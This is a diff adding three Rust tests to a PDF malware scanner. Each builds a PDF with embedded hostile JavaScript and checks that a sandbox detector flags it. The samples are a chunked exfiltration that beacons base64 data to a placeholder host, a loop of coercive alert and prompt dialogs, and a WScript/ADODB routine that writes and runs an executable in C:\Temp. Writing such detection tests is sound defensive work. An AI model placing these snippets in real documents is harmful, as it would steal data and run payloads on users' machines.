@@ -380,3 +380,69 @@ fn sandbox_emits_modern_fingerprint_evasion_finding() {
         Some("modern_fingerprint_evasion")
     );
 }
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_chunked_data_exfil_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var parts=[];parts.push\\('AA'\\);parts.push\\('BB'\\);var p=btoa\\(parts.join\\(''\\)\\);navigator.sendBeacon\\('https://example.invalid/a',p\\);navigator.sendBeacon\\('https://example.invalid/b',p\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_chunked_data_exfil")
+        .expect("js_runtime_chunked_data_exfil finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("chunked_data_exfil_pipeline")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_interaction_coercion_finding() {
+    let bytes = build_minimal_js_pdf(
+        "alert\\('Enable content to continue'\\);confirm\\('Please allow now'\\);prompt\\('Retry to continue'\\);setTimeout\\(function\\(\\)\\{\\},1\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_interaction_coercion")
+        .expect("js_runtime_interaction_coercion finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("interaction_coercion_loop")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_lotl_api_chain_execution_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var shell=WScript.CreateObject\\('WScript.Shell'\\);shell.ExpandEnvironmentStrings\\('%TEMP%'\\);var stream=WScript.CreateObject\\('ADODB.Stream'\\);stream.Open\\(\\);stream.Write\\('MZ'\\);stream.SaveToFile\\('C:\\\\\\\\Temp\\\\\\\\x.bin',2\\);shell.Run\\('C:\\\\\\\\Temp\\\\\\\\x.bin',0,false\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_lotl_api_chain_execution")
+        .expect("js_runtime_lotl_api_chain_execution finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("lotl_api_chain_execution")
+    );
+}
